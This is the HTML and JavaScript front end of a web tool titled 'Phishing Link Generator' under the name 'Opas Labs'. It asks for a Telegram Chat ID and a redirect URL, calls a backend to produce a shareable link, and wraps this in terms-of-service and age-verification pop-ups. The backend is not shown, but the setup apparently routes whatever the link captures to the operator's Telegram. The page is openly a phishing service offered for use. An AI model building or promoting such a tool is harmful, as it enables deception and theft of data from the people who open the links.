<!DOCTYPE html><html>
<head>
  <title>Opas Labs - Phishing Link Generator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <style>
    :root {
      --primary: #6a11cb;
      --secondary: #2575fc;
      --accent: #00f2fe;
      --dark: #0c1021;
      --darker: #070a15;
      --light: #f5f9ff;
      --transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    body {
      background: linear-gradient(135deg, var(--darker), var(--dark));
      color: var(--light);
      min-height: 100vh;
      overflow-x: hidden;
      line-height: 1.6;
    }
    .particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      opacity: 0.3;
    }
    .container {
      max-width: 600px;
      margin: 4rem auto;
      padding: 2rem;
      background: rgba(12, 16, 33, 0.8);
      border-radius: 20px;
      border: 1px solid rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
      position: relative;
      overflow: hidden;
      z-index: 10;
    }
    .logo {
      text-align: center;
      margin-bottom: 2rem;
    }
    .logo h1 {
      font-size: 2.5rem;
      background: linear-gradient(90deg, var(--accent), var(--primary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      display: inline-block;
      margin-bottom: 0.5rem;
    }
    .logo p {
      color: rgba(255, 255, 255, 0.7);
      font-size: 1.1rem;
    }
    .input-group {
      margin-bottom: 1.5rem;
      position: relative;
    }
    .input-group label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 600;
      color: var(--accent);
    }
    .input-group i {
      position: absolute;
      left: 15px;
      top: 70%;
      transform: translateY(-50%);
      color: var(--accent);
      font-size: 1.2rem;
    }
    input[type="text"],
    input[type="url"] {
      width: 100%;
      padding: 1rem 0.8rem 1rem 3rem;
      background: rgba(7, 10, 21, 0.7);
      color: var(--light);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 8px;
      font-size: 16px;
      transition: var(--transition);
    }
    button {
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      color: white;
      border: none;
      padding: 1rem 1.5rem;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
      font-weight: bold;
      transition: var(--transition);
      box-shadow: 0 5px 15px rgba(37, 117, 252, 0.3);
    }
    #result {
      margin-top: 1.5rem;
      padding: 1.5rem;
      background: rgba(7, 10, 21, 0.7);
      border-radius: 8px;
      border: 1px solid rgba(255, 255, 255, 0.05);
      display: none;
    }
    #generatedLink {
      display: block;
      padding: 0.8rem;
      background: rgba(12, 16, 33, 0.9);
      border-radius: 6px;
      border: 1px solid rgba(255, 255, 255, 0.05);
      margin-bottom: 1rem;
      color: var(--light);
      word-break: break-word;
      text-decoration: none;
    }
    .modal {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(7, 10, 21, 0.3);
      backdrop-filter: blur(10px);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    .modal-content {
      background: rgba(12, 16, 33, 0.9);
      padding: 2rem;
      border-radius: 15px;
      max-width: 500px;
      width: 90%;
      text-align: center;
    }
    .modal h2 {
      color: var(--accent);
      margin-bottom: 1rem;
    }
    .btn-group {
      display: flex;
      gap: 1rem;
      justify-content: center;
    }
    .btn-group .modal-btn {
      padding: 0.8rem 1.5rem;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      min-width: 120px;
    }
    .modal-btn.reject {
      background: linear-gradient(90deg, #f44336, #d32f2f);
    }
    .modal-btn.accept {
      background: linear-gradient(90deg, #4CAF50, #2E7D32);
    }
  </style>
</head>
<body><!-- T&C Modal --><div id="termsModal" class="modal">
  <div class="modal-content">
    <h2><i class="fas fa-file-contract"></i> Terms & Privacy</h2>
    <p>Please read and agree to the <a href="public/terms-and-conditions.html" target="_blank">Terms & Conditions</a> and <a href="public/privacy-policy.html" target="_blank">Privacy Policy</a>.</p>
    <div class="btn-group">
      <button class="modal-btn reject" onclick="window.location.href='https://youtube.com'">Decline</button>
      <button class="modal-btn accept" id="acceptTermsBtn">Accept</button>
    </div>
  </div>
</div><!-- Age Verification Modal --><div id="ageModal" class="modal">
  <div class="modal-content">
    <h2><i class="fas fa-exclamation-triangle"></i> Age Verification</h2>
    <p>This tool is for adults only. Confirm you're 18+ to continue.</p>
    <div class="btn-group">
      <button class="modal-btn reject" id="underageBtn">Under 18</button>
      <button class="modal-btn accept" id="adultBtn">I'm 18 or Older</button>
    </div>
  </div>
</div><div class="container">
  <div class="logo">
    <h1>Opas Labs</h1>
    <p>Phishing Link Generator</p>
  </div>
  <div class="input-group">
    <label for="telegramId">Telegram Chat ID</label>
    <i class="fas fa-paper-plane"></i>
    <input type="text" id="telegramId" placeholder="Enter your Telegram Chat ID">
  </div>
  <div class="input-group">
    <label for="redirectUrl">Redirect URL (optional)</label>
    <i class="fas fa-link"></i>
    <input type="url" id="redirectUrl" placeholder="https://example.com">
  </div>
  <button id="generateBtn"><i class="fas fa-bolt"></i> Generate Link</button>
  <div id="result">
    <a id="generatedLink" href="#" target="_blank"></a>
    <button id="copyBtn"><i class="fas fa-copy"></i> Copy Link</button>
  </div>
</div><script>
  const termsModal = document.getElementById('termsModal');
  const ageModal = document.getElementById('ageModal');
  const acceptTermsBtn = document.getElementById('acceptTermsBtn');
  const adultBtn = document.getElementById('adultBtn');
  const underageBtn = document.getElementById('underageBtn');
  const generateBtn = document.getElementById('generateBtn');

  generateBtn.addEventListener('click', function (e) {
    if (!localStorage.getItem('termsAccepted')) {
      e.preventDefault();
      termsModal.style.display = 'flex';
    } else if (!localStorage.getItem('ageVerified')) {
      e.preventDefault();
      ageModal.style.display = 'flex';
    } else {
      generateLink();
    }
  });

  acceptTermsBtn.addEventListener('click', function () {
    localStorage.setItem('termsAccepted', 'true');
    termsModal.style.display = 'none';
    ageModal.style.display = 'flex';
  });

  adultBtn.addEventListener('click', function () {
    localStorage.setItem('ageVerified', 'true');
    ageModal.style.display = 'none';
    generateLink();
  });

  underageBtn.addEventListener('click', function () {
    window.location.href = 'https://youtu.be/020g-0hhCAU';
  });

  async function generateLink() {
    const telegramId = document.getElementById('telegramId').value.trim();
    const redirectUrl = document.getElementById('redirectUrl').value.trim() || 'https://google.com';
    if (!telegramId) {
      alert('Please enter Telegram Chat ID');
      return;
    }
    try {
      generateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating...';
      const response = await fetch('/api/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ telegramId, redirectUrl })
      });
      const data = await response.json();
      document.getElementById('generatedLink').href = data.link;
      document.getElementById('generatedLink').textContent = data.link;
      document.getElementById('result').style.display = 'block';
    } catch (error) {
      alert('Error generating link');
    } finally {
      generateBtn.innerHTML = '<i class="fas fa-bolt"></i> Generate Link';
    }
  }

  document.getElementById('copyBtn').addEventListener('click', () => {
    const link = document.getElementById('generatedLink').textContent;
    navigator.clipboard.writeText(link);
    const btn = document.getElementById('copyBtn');
    btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
    setTimeout(() => {
      btn.innerHTML = '<i class="fas fa-copy"></i> Copy Link';
    }, 2000);
  });
</script></body>
</html>
